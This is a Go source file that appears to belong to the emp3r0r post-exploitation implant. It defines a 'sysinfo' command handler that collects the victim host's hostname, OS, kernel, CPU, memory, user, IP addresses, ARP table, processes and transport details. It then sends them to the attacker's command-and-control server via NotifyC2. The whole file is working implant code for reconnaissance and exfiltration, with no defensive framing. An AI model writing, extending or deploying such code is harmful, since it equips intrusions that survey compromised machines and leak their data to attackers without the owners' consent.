package handler

import (
	"fmt"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/spf13/cobra"
)

func sysinfoCmdRun(cmd *cobra.Command, args []string) {
	// Parse flags
	cpu, _ := cmd.Flags().GetBool("cpu")
	mem, _ := cmd.Flags().GetBool("mem")
	osInfo, _ := cmd.Flags().GetBool("os")
	net, _ := cmd.Flags().GetBool("net")
	user, _ := cmd.Flags().GetBool("user")
	full, _ := cmd.Flags().GetBool("full")

	var output strings.Builder

	// Default to full if no specific flag is set
	if full || (!cpu && !mem && !osInfo && !net && !user) {
		info := agentutils.CollectFullSystemInfo()
		output.WriteString(fmt.Sprintf("Hostname: %s\n", info.Hostname))
		output.WriteString(fmt.Sprintf("OS: %s\n", info.OS))
		output.WriteString(fmt.Sprintf("Kernel: %s\n", info.Kernel))
		output.WriteString(fmt.Sprintf("Arch: %s\n", info.Arch))
		output.WriteString(fmt.Sprintf("CPU: %s\n", info.CPU))
		output.WriteString(fmt.Sprintf("Mem: %s\n", info.Mem))
		output.WriteString(fmt.Sprintf("User: %s\n", info.User))
		output.WriteString(fmt.Sprintf("IPs: %v\n", info.IPs))
		output.WriteString(fmt.Sprintf("ARP: %v\n", info.ARP))
		output.WriteString(fmt.Sprintf("Process: %v\n", info.Process))
	} else {
		if osInfo {
			info := agentutils.GatherSystemDetails()
			output.WriteString(fmt.Sprintf("Hostname: %s\nOS: %s\nKernel: %s\nArch: %s\n", info.Hostname, info.OS, info.Kernel, info.Arch))
		}
		if cpu {
			output.WriteString(fmt.Sprintf("CPU: %s\n", util.GetCPUInfo()))
		}
		if mem {
			output.WriteString(fmt.Sprintf("Mem: %d MB\n", util.GetMemSize()))
		}
		if user {
			info := agentutils.GatherSystemDetails()
			output.WriteString(fmt.Sprintf("User: %s\n", info.User))
		}
		if net {
			info := agentutils.CollectFullSystemInfo()
			output.WriteString(fmt.Sprintf("IPs: %v\n", info.IPs))
			output.WriteString(fmt.Sprintf("ARP: %v\n", info.ARP))
			output.WriteString(fmt.Sprintf("Transport: %v\n", info.Transport))
		}
	}

	c2transport.NotifyC2(cmd, "%s", output.String())
}
